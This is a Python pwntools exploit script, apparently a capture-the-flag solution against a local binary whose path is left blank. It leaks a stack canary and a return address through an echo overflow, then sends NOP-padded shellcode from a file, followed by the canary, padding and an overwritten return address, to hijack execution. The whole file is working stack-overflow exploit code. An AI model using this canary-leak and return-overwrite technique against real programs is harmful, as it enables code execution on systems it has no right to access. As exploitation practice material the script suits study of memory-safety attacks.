#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_gdb = '''
set disassembly-flavor intel
break _exit
c
display/8i $rip
display/x $rbp
display/x $rsp
display/x $rax
'''

#p = gdb.debug(bp, gdbscript=_gdb, terminal=["tmux", "splitw", "-h"])

def exploit(p, return_address, canary):
    with open("asm/smalltext", "rb") as f:
        shellcode = f.read()
    shellcode = bytes(shellcode)
    shellcode = bytes.fromhex("90" * (int("0x88", 16) - len(shellcode))) + shellcode
    shellcode += pack(int(canary,16))
    shellcode += bytes.fromhex("41" * 8) + p64(int(return_address, 16) - 0x11b0)
    size = bytes(str(int(len(shellcode))),encoding="utf-8")
    print("[!>] sz:", hex(int(size.decode())))

    p.recv()
    p.sendline(size)
    p.recv()
    p.sendline(shellcode)
    p.recvuntil(b"You said: ").decode()
    try:
        print(p.recv().split(b"\n")[4].decode())
    except:
        print("failed???")
        print(p.recv())

# Some of this is garbage sorry
def parser(p):
    shellcode = pack(int.from_bytes(b"REPEAT", byteorder="little"))
    shellcode += bytes.fromhex("41" * (int("0x89", 16) - len(shellcode)))
    size = bytes(str(int(len(shellcode))),encoding="utf-8")
    p.recv()
    p.sendline(size)
    p.recv()
    p.sendline(shellcode)
    canary = hex(int.from_bytes(p.recvline_regex(b"You said: ").split(b": ")[-1][int(len(shellcode)):], byteorder="little")) + "00"
    if len(canary[2:]) > 16:
        print(f"[>!] Large number returned \"{canary}\", {len(canary)-2} bytes.. parsing canary")
        return_address = canary[:-16]
        print(f"[>>] Potential return: {return_address}\n[+>] {len(return_address)-2} bytes")
        canary = canary[-16:]
        canary = "0x" + canary
        print(f"[>>] Canary: {canary}\n[+>] {len(canary)-2} bytes")
        exploit(p, return_address, canary)
    elif len(canary[2:]) < 24 or len(canary[2:]) < 16:
        print("[!] No ret found :(")
        p.close()
        p.kill()
        runner()

def runner():
    p = process()
    parser(p)

runner()
